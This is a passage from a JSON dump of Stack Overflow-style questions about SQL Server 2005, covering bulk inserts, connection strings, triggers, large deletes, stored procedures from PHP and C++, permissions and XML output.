procedure name.</p>\n\n<p>Can this be done and if so how does one do it?</p>\n"},{"tags":["sql-server","sql-server-2005","insert","bcp","bulk"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":838,"score":0,"question_id":460508,"title":"How to save data from a semicolon delimited file using Bulk Insert in SQL Server 2005 and BCP 9?","body":"<p>Here is my sample data:</p>\n\n<pre><code>1;a;b;c;; 2;d;e;f;; 3;g;h;i;; \n4;j;k;l;; 5;m;n;o;; \n6;p;q;r;;\n</code></pre>\n\n<p>Here is my sample format file (BCP 9):</p>\n\n<pre><code>9.0\n7\n1 SQLCHAR 0 0 \"\"  0 x Latin1_General_CI_AS\n2 SQLCHAR 0 0 \";\" 2 i Latin1_General_CI_AS\n3 SQLCHAR 0 0 \";\" 3 s Latin1_General_CI_AS\n4 SQLCHAR 0 0 \";\" 4 t Latin1_General_CI_AS\n5 SQLCHAR 0 0 \";\" 5 u Latin1_General_CI_AS\n6 SQLCHAR 0 0 \";\" 6 v Latin1_General_CI_AS\n7 SQLCHAR 0 0 \"\\r\\n\" 0 x Latin1_General_CI_AS\n</code></pre>\n\n<p>Here is the table structure:</p>\n\n<pre><code>create table bcp \n(\n    id int identity, \n    i int, \n    s varchar(2), \n    t varchar(2), \n    u varchar(2), \n    v varchar(2), \n    dte datetime default getdate()\n)\n</code></pre>\n\n<p>Problem is that when I used \"\\r\\n\", only 1, 4, 6 is save not all, but when I try to use \"\\0\", only first record is save.\nHow I am gonna solve this problem?</p>\n\n<p>Another Question, what is rowterminator for blank spaces after semicolon?</p>\n"},{"tags":["c#",".net","sql-server","sql-server-2005","tsql"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":312,"score":0,"question_id":3335100,"title":"T-SQL: find an empty column","body":"<p><br>\nIn my table there are 10 columns used for storing \"items\" (game server). When an user picks the item up, it should loop through columns 0-9 (with names \"I0\"..\"I9\") and returns once the column in current row is empty. I cannot figure out how to do it on the SQL server side.\nI can only think of IF EXISTS for each column but that is not really good.. Glad for any help! Thanks</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":10945968,"title":"Adding user and password to Sql Server database","body":"<p>My connection string defined in Web.Config currently indicatea no user or password is needed:</p>\n\n<pre><code>&lt;connectionStrings&gt;\n    &lt;add name=\"CinemaxConnectionString\" connectionString=\"Data Source=PCName\\SQLEXPRESS;Initial Catalog=Cinemax;Integrated Security=True\"\n      providerName=\"System.Data.SqlClient\" /&gt;\n  &lt;/connectionStrings&gt;\n</code></pre>\n\n<p>I would like to add user and password, like this:</p>\n\n<pre><code>&lt;connectionStrings&gt;\n    &lt;add name=\"CinemaxConnectionString\" connectionString=\"Data Source=PCName\\SQLEXPRESS;Initial Catalog=Cinemax;User=cinemax; Password=abc\"\n      providerName=\"System.Data.SqlClient\" /&gt;\n  &lt;/connectionStrings&gt;\n</code></pre>\n\n<p>Obviously, this requires changing some settings <strong>in Sql Server to add user and password</strong>. What is the best way to do this? I specify I have Sql Server 2005 Express and the <strong>current authentcation mode is \"Sql Server and Windows Authentication\"</strong>.\nThank you in advance for your help.\nIt would be nice to see a double take on this: user-interface and code solution.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","triggers","temporary-tables"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1447,"score":0,"question_id":5295748,"title":"trigger and transactions on temporary tables","body":"<p>can we create trigger and transactions on temporary tables?</p>\n\n<p>when user will insert data then , if it is committed then the trigger would be fired , and that data would go from the temporary table into the actual tables.</p>\n\n<p>and when the SQL service would stop, or the server would be shutdown, then the temporary tables would be deleted automatically.</p>\n\n<p>or shall i use an another actual table , in which first the data would be inserted and then if it is committed then the trigger would be fired and the data would be sent to the main tables and then i would execute a truncate query to remove data from the interface table, hence removing the duplicate data.</p>\n"},{"tags":["c#","sql-server","sql-server-2005","ado.net"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":113,"score":0,"question_id":10944244,"title":"How to retrieve date from database & bind it to datechooser?","body":"<p>I am using SQL server 2005,I want to retrieve date stored in database for particular record &amp; want to set that date to datechooser. How can i do this?</p>\n"},{"tags":["sql-server","sql-server-2005","database-design","primary-key"],"answer_count":5,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1785,"score":4,"question_id":3820213,"title":"What is the difference between Primary Key and unique key constraint?","body":"<p>What is the difference between <code>Primary key</code> And <code>unique Key constraint</code>?</p>\n\n<p>What's the use of it?? </p>\n"},{"tags":["c++","xml","sql-server-2005","visual-c++","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":10943357,"title":"ADO Not Supporting XML in stored procedure","body":"<p>When trying to execute store procedure in sql server from c++ i am getting ce = {DB_E_ERRORSINCOMMAND}</p>\n\n<p>c++ code is</p>\n\n<pre><code>pCom-&gt;Execute(NULL,NULL,adCmdStoredProc);\n</code></pre>\n\n<p>executing from command object..</p>\n\n<p>store procedure look like this </p>\n\n<pre><code>create PROCEDURE [dbo].[InsertTicketDetails]\nAS\nBEGIN\nDECLARE @inputXml XML;\nSET NOCOUNT ON\nset @inputXml = '&lt;Record&gt;&lt;studentid&gt;143&lt;/studentid&gt;&lt;/Record&gt;';\n\nINSERT INTO dbo.sample (studentid)\n    SELECT \n        @inputXml.value( 'studentid[1]', 'int' ) AS studentid        \n    FROM @inputXml.nodes('/Record') a(y)\nEND\n</code></pre>\n\n<p>here inserstion is done with xml, if insertion done without xml working properly. i think it problem with xml or we cant access the xml functionality of sql server from c++?</p>\n"},{"tags":["sql","sql-server-2005","delete"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1017,"score":0,"question_id":2002187,"title":"SQL Server 2005 efficient delete","body":"<p>My issue at hand is that i need to remove about 60M records from a table with out causing deadlocks with other processes that use this table. At this point i'm almost done removing the records using a while loop that only processes about 1M records at a time however its taken all day. </p>\n\n<p>Q1: What is the optimal way to remove large quantities of data from a table, keeping the table online and minimal impact to other resources that need to use this table in MS SQL Server 2005? </p>\n\n<p>Q2: Is there a way to implement the individual row locking (rather than table locking) in SQL Server like they have in Oracle? (Note answering this may answer Q1). </p>\n\n<p>A2: So as @Remus Rusanu informed me there is a way to do <a href=\"http://msdn.microsoft.com/en-us/library/aa258847%28SQL.80%29.aspx\" rel=\"nofollow\">row level locking</a> with a delete. Thanks.</p>\n"},{"tags":["php","sql-server","sql-server-2005","while-loop"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":175,"score":1,"question_id":10941904,"title":"php mssql while loop","body":"<p>I have an unusual issue with my while loop,</p>\n\n<p>here is the code:</p>\n\n<pre><code>$link = mssql_connect($myServer, $myUser, $myPass);\n\nif (!$link || !mssql_select_db($myDB, $link)) {\n    die('Unable to connect or select database!');\n}\n\n$result = mssql_query(\"SELECT\nTBL_1.FULLNAME AS FullName,\nCAST(TBL_3.NOTE AS VARCHAR(MAX)) AS Note,\nTBL_3.CREATEDATE AS CreateDate,\nTBL_4.UNAME AS Creator\nFROM\ndatabase.dbo.TBL_1 TBL_1,\ndatabase.dbo.TBL_2 TBL_2,\ndatabase.dbo.TBL_3 TBL_3,\ndatabase.dbo.TBL_4 TBL_4\nWHERE\nTBL_1.UID = TBL_2.UID AND\nTBL_2.NOTEID = TBL_3.NOTEID AND\nTBL_3.CREATORID = TBL_4.USERID AND\nTBL_1.UID = '$id'\nORDER BY CreateDate desc\") or die(mssql_get_last_message());\n\nif (!mssql_num_rows($result)) {\n                            echo '&lt;tr&gt;\n                                    &lt;td width=\"600px\"&gt; No results returned&lt;/td&gt;\n                                    &lt;/tr&gt;';\n                        } else {\n                            while ($row =mssql_fetch_assoc($result)){                           \n                            echo \"&lt;tr&gt;\n                                    &lt;td width='15px'&gt; \".++$counter.\" &lt;/td&gt;\n                                    &lt;td width='600px'&gt; \".$row['Note'].\" &lt;/td&gt;\n                                    &lt;td width='185px'&gt;\".$row['CreateDate'].\"&lt;/td&gt;\n                                    &lt;td width='185px'&gt;\".$row['Creator'].\"&lt;/td&gt;\n                                &lt;/tr&gt;\";\n                                }\n                    }\n</code></pre>\n\n<p>For majority of the records, everything is as expected.  In some cases though,  the while loop doesn't respond at all.  no errors, no text, just as if I never ran the command.</p>\n\n<p>I tried searching and reading as much as I could, but without an error, its quiet difficult to find the solution.  </p>\n\n<p>Have tried using foreach instead, and it took a ton of scrubbing and cleaning to get it to not show 1 character per line.  Though it really just kept repeating the 1st record.  </p>\n\n<p>I should also point out that 1 of the rows is in RTF format, but I dont think that plays a role.  </p>\n\n<p>I'm connecting from a *nix machine to a MS SQL2005 server.  </p>\n\n<p>Thanks in advance for any and all advice!</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":687,"score":1,"question_id":10937929,"title":"Compare 2 consecutive rows in same table and update row2 with row1 value","body":"<p>I need to compare 2 consecutive rows in the same table. If the data is missing in the second row, I should update it with the first row's data.</p>\n\n<p>For Eg:</p>\n\n<pre><code>Row   EmpID  DATE        PosID        EmpStatus  EmpDept  EmpVP\n----------------------------------------------------------------------\n1     21     2010-12-31  NULL         TC         NULL     40\n2     21     2010-01-25  90156840101  NULL       407      NULL\n3     21     2003-11-25  NULL         AC         NULL     NULL\n</code></pre>\n\n<p>First Iteration: Since Row1 EmpStatus = TC, I want to Update the EmpStatus on Row2 to TC (Since its NULL) and EmpVP to 40 on Row2, as shown below:</p>\n\n<pre><code>Row   EmpID  DATE        PosID        EmpStatus  EmpDept  EmpVP\n----------------------------------------------------------------------\n1     21     2010-12-31  NULL         TC          NULL    40\n2     21     2010-01-25  90156840101  TC          407     40 \n3     21     2003-11-25  NULL         AC          NULL    NULL\n</code></pre>\n\n<p>Second Iteration: Since PositionID is NULL on Row3, I want to update Row3 with the PositionID of Row2. Since Row2 now has EmpStatus = TC, I want to compare the row2 and row3 data. Since Row3 has a new value, I want to retain the new value \"AC\". But at the same time I want to update the value of EmpDept of Row3 = 40 since it's NULL. The desired results are shown below:</p>\n\n<pre><code>Row   EmpID  DATE        PosID        EmpStatus  EmpDept  EmpVP\n----------------------------------------------------------------------\n1     21     2010-12-31  NULL         TC          NULL    40\n2     21     2010-01-25  90156840101  TC          407     40 \n3     21     2003-11-25  90156840101  AC          407     40\n</code></pre>\n\n<p>I am working on historical data load and I have to build records going backwards in terms of Dates.</p>\n\n<p>Can anyone please tell me how to code this?\nI want to know if we can do these updates, preferably without using cursors, as I have a lot of employees in this table.</p>\n\n<p>Thanks a lot!</p>\n"},{"tags":["sql-server","sql-server-2005","backup","restore","disconnect"],"answer_count":6,"favorite_count":8,"up_vote_count":26,"down_vote_count":0,"view_count":20569,"score":26,"question_id":1154200,"title":"When restoring a backup, how do I disconnect all active connections?","body":"<p>My SQL Server 2005 doesn't restore a backup because of active connections. How can I force it?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":6876,"score":6,"question_id":56923,"title":"How do I script a password change for a SQL server login?","body":"<p>Just what the title says, I need to change the password for an existing sql server login and I want to do it via sql script.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":235,"score":5,"question_id":10931976,"title":"SQL - alert if there is a new unique record inserted in the last hour","body":"<p>I am trying to find an elegant solution in the form of a SQL query for the following problem.</p>\n\n<p>New records will be inserted in the Log table. \nI need to detect any new records (inserted in the last hour) that I haven't seen before and generate an alert (e.g. # of these records > 0)</p>\n\n<pre><code>ID, Url, DOB\n1, site1.com/page1, \"5/06/2012 20:01\"\n2, site2.com/page2, \"5/06/2012 21:20\"\n3, site1.com/page1, \"6/06/2012 10:05\"\n</code></pre>\n\n<p>If \"now\" is 6/06/2012 10:40 - I see that there was 1 new record (id=3) inserted but I don't want to generate an alert because we have seen this URL before (id=1).</p>\n\n<p>if we have \n4, site3.com/pageX, \"6/06/2012 10:08\"\nthen I want to generate an alert (return count=1) because this row was inserted in the last hour and we haven't seen it before.</p>\n\n<p>What is the best way to implement it? ideally without nested queries</p>\n"},{"tags":["sql-server-2005","memory","buffer","page-life-expectancy"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":199,"score":0,"question_id":10936645,"title":"Why is the page life expectancy 0 (zero) on SQL Server 2005","body":"<p>We have been wanting to know the page life expectancy for our SQL Server. So we look at the counter using Perform. The value is ZERO and never changes. I thought there must be some bug, so I checked the SQL Server DMV query</p>\n\n<pre><code>SELECT [object_name],[counter_name],[cntr_value]\nFROM sys.dm_os_performance_counters\nWHERE [object_name] LIKE '%Manager%'\nAND [counter_name] = 'Page life expectancy'\n</code></pre>\n\n<p>That also returns zero, all day long.</p>\n\n<p>To make this more interesting, we checked the 'buffer cache hit ratio' counter, with it averaging around 99-100.</p>\n\n<p>So how is the page life expectancy zero while the 'buffer cache hit ratio' is 100?</p>\n\n<p>What are we missing? if it's always zero, it would mean to me that nothing stays in the buffer cache, which seems incorrect if the buffer cache hit ratio is 100?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":465,"score":0,"question_id":10935090,"title":"The database '[path\\MDF file] cannot be opened because it is version 661. This server supports version 655 and earlier","body":"<p>I copied my project to my hosting server space and received the following message while trying to run it:</p>\n\n<blockquote>\n  <p>The database '[path\\MDF file] cannot be opened because it is version\n  661. This server supports version 655 and earlier. A downgrade path is not supported.</p>\n</blockquote>\n\n<p>Any suggestions? I imagine it has to do with me using SQL Server Express 2008 and the hosting provider isn't. If so, where do I go from here? Does SSE have scripts available for re-creating the tables, and in another version?</p>\n"},{"tags":["sql-server-2005","permissions","import"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":809,"score":2,"question_id":2628753,"title":"database importing problem with sql server","body":"<p>I have a database working in my local sql server 2005 express edition.</p>\n\n<p>I have to import my local database to a remote server database.</p>\n\n<p>For that i established connection to that remote server, and i can now see that database . but when i tried to restore database from my local machine i'm getting an error message when i tried to give backup file location. Below is the error message</p>\n\n<p>The EXECUTE permission was denied on the object 'xp_availablemedia', database 'mssqlsystemresource', schema 'sys'.\nThe user does not have permission to perform this action.\nThe statement has been terminated. (Microsoft SQL Server, Error: 229)</p>\n\n<p>what is the problem, how can i solve this.</p>\n\n<p>Please help me</p>\n"},{"tags":["sql-server","sql-server-2005","sqlclr"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":136,"score":2,"question_id":10178219,"title":"Restricting execute of a user defined CLR function to sysadmin and not dbowner","body":"<p>I'm probably missing something obvious or going about this in the wrong way, but here it goes:</p>\n\n<p>I've written a scalar CLR function in SQL Server 2005. It has one parameter (<code>int</code>) and returns a <code>varchar(2000)</code>. I'm having trouble figuring out how to specifically grant permissions to sysadmin role and restrict any other role, including db_owner, from executing it.</p>\n\n<p>I'm guessing that granting and revoking permissions is the same for CLR functions as any other UDF. This is a sensitive function because it decrypts a password that's stored in a SecurityUser table for the application. I don't want anyone to be able to run it except members of the sysadmin role. </p>\n\n<p>In the database, I first tried granting to sysadmin from the database:</p>\n\n<pre><code>grant execute ON dbo.fCrossTabDx1 TO sysadmin\n</code></pre>\n\n<p>and of course received the error: </p>\n\n<blockquote>\n  <p>Msg 15151, Level 16, State 1, Line 1<br>\n  Cannot find the user\n  'sysadmin', because it does not exist or you do not have permission.</p>\n</blockquote>\n\n<p>I then tried to grant permission to <code>db_securityadmin</code>, which is a role in the database and got error:</p>\n\n<blockquote>\n  <p>Msg 4617, Level 16, State 1, Line 1<br>\n  Cannot grant, deny or revoke\n  permissions to or from special roles.</p>\n</blockquote>\n\n<p>So, would appreciate someone steering me in the right direction, if this is possible. </p>\n\n<ol>\n<li>Can I restrict a user with db_owner permissions from executing a function, and </li>\n<li>Can I allow only sysadmin role execution permission on a function?</li>\n</ol>\n\n<p>Thanks. </p>\n"},{"tags":["sql","sql-server","sql-server-2005","datetime","internal-representation"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1061,"score":2,"question_id":1143259,"title":"What is the internal representation of datetime in sql server?","body":"<p>What is the underlying datastructure of datetime values stored in SQL Server (2000 and 2005 if different)?  Ie down to the byte representation?</p>\n\n<p>Presumably the default representation you get when you select a datetime column is a culture specific value / subject to change.  That is, some underlying structure that we don't see is getting formatted to YYYY-MM-DD HH:MM:SS.mmm.</p>\n\n<p>Reason I ask is that there's a generally held view in my department that it's stored in memory literally as YYYY-MM-DD HH:MM:SS.mmm but I'm sure this isn't the case.</p>\n"},{"tags":["sql-server-2005","flags","dbnull","data-integration"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":10932202,"title":"Update many flag columns given the value of other columns (NULL values) in the same record","body":"<p>Given a table of input data I would like to have a set o <strong>\"flag columns\" that describe sibling columns of the same record</strong>. </p>\n\n<ul>\n<li>I am using Microsoft <strong>SQL Server 2005</strong>.</li>\n<li>First of all I need to load data in the target table, then I need to perform checks to put values in those flag columns.</li>\n</ul>\n\n<p>Say for example I have a toy table like the following one:</p>\n\n<pre><code>CREATE TABLE zzz_test\n             (\n                          color        VARCHAR(10),\n                          value_x      INTEGER    ,\n                          value_y      INTEGER    ,\n                          value_x_FLAG bit        ,\n                          value_y_FLAG bit\n             )\n</code></pre>\n\n<p>Then I have the following toy data (I need to repeat the INSERT/VALUES statements for every record because of the \"old\" 2005 SQL version):</p>\n\n<pre><code>INSERT zzz_test(color,value_x,value_y)\nVALUES('red',1,NULL)\nINSERT zzz_test(color,value_x,value_y)\nVALUES('green',NULL,NULL)\nINSERT zzz_test(color,value_x,value_y)\nVALUES('red',NULL,2)\nINSERT zzz_test(color,value_x,value_y)\nVALUES('red',1,3)\nINSERT zzz_test(color,value_x,value_y)\nVALUES('black',NULL,1)\nINSERT zzz_test(color,value_x,value_y)\nVALUES(NULL,3,2)\nINSERT zzz_test(color,value_x,value_y)\nVALUES('black',1,2)\nINSERT zzz_test(color,value_x,value_y)\nVALUES('red',3,4)\nINSERT zzz_test(color,value_x,value_y)\nVALUES('green',1,1)\nINSERT zzz_test(color,value_x,value_y)\nVALUES('blue',5,NULL)\n</code></pre>\n\n<p>Now I would like to have a quick way to put values inside <code>value_x_FLAG</code> and <code>value_y_FLAG</code> evaluating if sibling columns <code>value_x</code> and <code>value_y</code> are <strong><code>NULL</code></strong>.</p>\n\n<p>I know that there are functions like <code>ISNULL()</code>, or <code>COALESCE()</code>, but I do not think this is the case because <strong>I am trying to update a column given the value of another column</strong>.</p>\n\n<p>I know I can use <code>IF / ELSE</code> statements but it's quite complicate to set all the cases of many boolean flags (2^n) to work all together in the same \"update\" statement of the flag variables.</p>\n\n<p>How to deal with it?</p>\n\n<p>After setting all the flags I would like to summarize in some way my table. For example I would like to have a <code>COUNT</code> on all the flag variables, then I would like to have a <code>COUNT</code> given the \"<em>color category</em>\".</p>\n\n<p>Probably I do not need a set of support flag variables, but I would like to have them to make the table much more readable, and also the SQL code much more readable.\nThanks!</p>\n"},{"tags":["php","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1523,"score":1,"question_id":6851317,"title":"Retrieve data returned by a Stored Procedure: Php & MS SQL SERVER","body":"<blockquote>\n  <p>This question relates to:</p>\n  \n  <p>PHP Version 5.3.6</p>\n  \n  <p><a href=\"http://msdn.microsoft.com/en-us/library/cc296170%28v=sql.90%29.aspx\" rel=\"nofollow\">Microsoft Drivers for PHP for SQL Server</a></p>\n</blockquote>\n\n<p>I am trying to properly retrieve data from a stored procedure.</p>\n\n<p>This question assumes the existence of the following stored procedure:</p>\n\n<pre><code>CREATE PROCEDURE test_procedure\nAS\n     BEGIN\n           SET NOCOUNT ON\n           --A bunch of SQL statements\n           --More SQL statements\n           SELECT 'Doctor Who Rules!'\n     END\n</code></pre>\n\n<p>I've tried the following code which runs through all of my commands but does not return the data from the final SELECT.</p>\n\n<pre><code>$sql = \"EXEC test_procedure;\";\n$result = sqlsrv_query($conn,$sql);\n$next_result = sqlsrv_next_result($result); // returns a boolean\n$row = sqlsrv_fetch_array($result);\n</code></pre>\n\n<p>Using sqlsrv_execute does not work with the above code either.</p>\n\n<p>How can I return the data geneated by the stored procedure above via PHP?</p>\n\n<p>Thank you.</p>\n\n<p><strong>Addendum #1 (Classic ASP Counterpart)</strong></p>\n\n<pre><code>sqlCMD = \"EXEC test_procedure;\"\nSet conn = Server.CreateObject(\"ADODB.Connection\")\nconn.Open _ConnectionString_Variable_\nSet rs = conn.Execute(sqlCMD)\n</code></pre>\n\n<p>I would get back a recordset with one row that has one field with the data \"Doctor Who Rules!\"</p>\n"},{"tags":["visual-studio","visual-studio-2010","sql-server-2005","reporting-services","reportviewer"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":718,"score":1,"question_id":10417563,"title":"ReportViewer Control Version Conflict","body":"<p>I am having a version problem with the ReportViewer Control. I am using visual studio 2010, but I think I need to use the 2005 report viewer because I am using SQL 2005. So, I set the webconfig file to point to the 2005 ReportViewer .dlls, everything works once, then VS edits the web.config to point to the 2010 versions of the dlls. Here is the relevant web config file sections set what I think is correctly:</p>\n\n<pre><code>&lt;httpHandlers&gt;\n  &lt;add path=\"elmah.axd\" verb=\"POST,GET,HEAD\" type=\"Elmah.ErrorLogPageFactory, Elmah\" /&gt;\n  &lt;add path=\"Reserved.ReportViewerWebControl.axd\" verb=\"*\" type=\"Microsoft.Reporting.WebForms.HttpHandler, Microsoft.ReportViewer.WebForms, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\n    validate=\"false\" /&gt;\n&lt;/httpHandlers&gt;\n\n&lt;compilation&gt;\n  &lt;assemblies&gt;\n    &lt;add assembly=\"Microsoft.ReportViewer.WebForms, Version=8.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\" /&gt;\n    &lt;add assembly=\"Microsoft.ReportViewer.Common, Version=8.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\" /&gt;\n  &lt;/assemblies&gt;\n  &lt;buildProviders&gt;\n    &lt;add extension=\".rdlc\" type=\"Microsoft.Reporting.RdlBuildProvider, Microsoft.ReportViewer.WebForms, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" /&gt;\n  &lt;/buildProviders&gt;\n&lt;/compilation&gt;\n\n&lt;system.webServer&gt;\n&lt;validation validateIntegratedModeConfiguration=\"false\" /&gt;\n&lt;handlers&gt;\n  &lt;add name=\"ReportViewerWebControlHandler\" preCondition=\"integratedMode\" verb=\"*\" path=\"Reserved.ReportViewerWebControl.axd\" \n       type=\"Microsoft.Reporting.WebForms.HttpHandler, Microsoft.ReportViewer.WebForms, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" /&gt;\n&lt;/handlers&gt;\n</code></pre>\n\n<p></p>\n\n<p>So, after running it and it working a few times, it automatically changes the version of the http handler to 10.0.0.0. How can I prevent this?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":350,"score":1,"question_id":10028460,"title":"EXEC Select Statement With Dynamic Column stores value into a Variable","body":"<p>I have an issue with a my SQL query. I need to execute a SQL statement using <code>EXEC</code> and one of the columns is already represented with a variable and I must now put the represent the value of that column with another variable. Can this be achieved and if so, can you please suggest any other solution for this?</p>\n\n<p>I found this snippet via Google. But even this doesn't give me the desired output.</p>\n\n<p>My SQL Statement:</p>\n\n<pre><code>declare @i int, @j int =10\nexec sp_executesql N'select @i ='+ @j, N'@i int output', @i output\nselect @i\n</code></pre>\n"},{"tags":["sql","sql-server-2005","table","insert","dump"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":289,"score":0,"question_id":10930251,"title":"SQL Server 2005, export table into inserts query","body":"<p>I'm not able to find in SQL Server 2005 the utility that phpmyadmin has for exporting tables.</p>\n\n<p>I need a way to dump all info a table contains in a query with all the instert into in it. </p>\n\n<p>How can I do that with SQL Server 2005?</p>\n\n<p>Thanks very much</p>\n"},{"tags":["sql-server-2005","query","timeoutexception"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":319,"score":0,"question_id":7537568,"title":"ASP.NET / SQL Server - Timeout expired while searching","body":"<p>We have a table called <code>Purchases</code>:</p>\n\n<pre><code>| PRSNumber   | ... | ... | ProjectCode |\n| PRJCD-00001 |     |     | PRJCD       |\n| PRJCD-00002 |     |     | PRJCD       |\n| PRJCD-00003 |     |     | PRJCD       |\n| PRJX2-00003 |     |     | PRJX2       |\n| PRJX2-00003 |     |     | PRJX2       |\n</code></pre>\n\n<p>Note: <code>ProjectCode</code> is the prefix of <code>PRSNumber</code>.</p>\n\n<p>Before, when there is no <code>ProjectCode</code> field in the table, our former developers use this query to search for purchases with specific supplier:</p>\n\n<pre><code>select * from Purchases where left(PRSNumber,5) = @ProjectCode\n</code></pre>\n\n<p>Yes, they concatenate the <code>PRSNumber</code> in order to obtain and compare the <code>ProjectCode</code>. Although, the code above works fine regardless of the table design.</p>\n\n<p>But when I added a new field, the <code>ProjectCode</code>, and use this query:</p>\n\n<pre><code>select * from Purchases where ProjectCode = @ProjectCode\n</code></pre>\n\n<p>I receive this exception:</p>\n\n<blockquote>\n  <p>Timeout expired. The timeout period elapsed prior to completion\n  of the operation or the server is not responding.</p>\n</blockquote>\n\n<p>I can't believe, that the first query, which needs concatenation before the compare, is faster than the second one which has to do nothing but compare. Can you please tell me why is this happening? </p>\n\n<p><strong>Some information which might be helpful:</strong></p>\n\n<ul>\n<li><code>PRSNumber</code> is <code>varchar(11)</code> and is the primary key</li>\n<li><code>ProjectCode</code> is <code>nvarchar(10)</code></li>\n<li>Both query works fine in SQL Server Management Studio</li>\n<li>First query works in ASP.NET website, but the second does not</li>\n<li><code>ProjectCode</code> is indexed</li>\n<li>The table has 32k rows</li>\n</ul>\n\n<p><strong>Update</strong></p>\n\n<ul>\n<li><code>ProjectCode</code> is now indexed, still no luck</li>\n</ul>\n"},{"tags":["c#","sql","sql-server-2005","stored-procedures","ado.net"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1139,"score":1,"question_id":5817847,"title":"Schema from stored procedure","body":"<p>I have a procedure, I want to read schema of the procedure. To retrieve view schema I use the query shown here. Same way I want to get schema of stored procedure. How to get it? Plz show some syntax.</p>\n\n<pre><code>public static DataTable SchemaReader(string tableName)\n{\n     string sql = string.Format(\"Select * from {0}\", tableName);\n     conn.Open();\n     SqlCommand cmd = new SqlCommand(sql, conn);\n     cmd.CommandType = CommandType.Text;\n     SqlDataReader reader = cmd.ExecuteReader();\n\n     DataTable schema = reader.GetSchemaTable();\n\n     reader.Close();\n     conn.Close();\n     return schema;\n}       \n</code></pre>\n\n<p>If have any query plz ask.Thanks in advance.</p>\n"},{"tags":["sql","xml","sql-server-2008","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":10923328,"title":"XML output issue going from SQL Server 2005 to 2008","body":"<p>We are moving an application from SQL Server 2005 to SQL Server 2008 and we are getting different output in XML from version to version. Can't quite figure out why.</p>\n\n<p>On the left is what we are getting in 2008 and on the right is what we have now. As you can see, we are dropping table aliases breaks in the structure.</p>\n\n<p>We use the standard FOR XML AUTO, ELEMENTS  The procedure is exactly the same, and I verified the data is also the same.</p>\n\n<p>Any ideas?</p>\n\n<p>Greatly appreciate any suggestions!</p>\n\n<p>Example from SQL Server 2005 (working) notice it's broken down by table name </p>\n\n<pre><code>&lt;n&gt;\n  &lt;ID&gt;00000&lt;/ID&gt;\n  &lt;CERT_TYPE&gt;CERT2&lt;/CERT_TYPE&gt;\n  **&lt;cert2&gt;**\n    &lt;CERT_NUM&gt;&lt;/CERT_NUM&gt;\n    &lt;CERT_THRU&gt;&lt;/CERT_THRU&gt;\n    &lt;MAINT_FEE_BAL&gt;0.00&lt;/MAINT_FEE_BAL&gt;\n    **&lt;CertInfo1&gt;**\n      &lt;CODE&gt;09&lt;/CODE&gt;\n      &lt;DESCRIPTION&gt;Not Certified - Exam Result: Did Not Pass (Dec 2005)&lt;/DESCRIPTION&gt;\n      &lt;LINK_TEXT&gt;Register for Next Exam&lt;/LINK_TEXT&gt;\n      &lt;LINK_URL&gt;&lt;/LINK_URL&gt;\n      &lt;LAST_DT_TO_APPLY&gt;&lt;/LAST_DT_TO_APPLY&gt;\n      &lt;APP_STATUS&gt;&lt;/APP_STATUS&gt;\n      &lt;CERT1_cycle&gt;\n        &lt;CYCLE_YR1&gt;&lt;/CYCLE_YR1&gt;\n        &lt;CEUYR1_REQ&gt;0&lt;/CEUYR1_REQ&gt;\n        &lt;CEUYR1_EARN&gt;0&lt;/CEUYR1_EARN&gt;\n</code></pre>\n\n<p>Example from SQL Server 2008 (missing the tables)</p>\n\n<pre><code>n&gt;\n  &lt;ID&gt;00000&lt;/ID&gt;\n  &lt;CERT_TYPE&gt;CERT1&lt;/CERT_TYPE&gt;\n  &lt;CERT_NUM&gt;&lt;/CERT_NUM&gt;\n  &lt;CERT_THRU&gt;&lt;/CERT_THRU&gt;\n  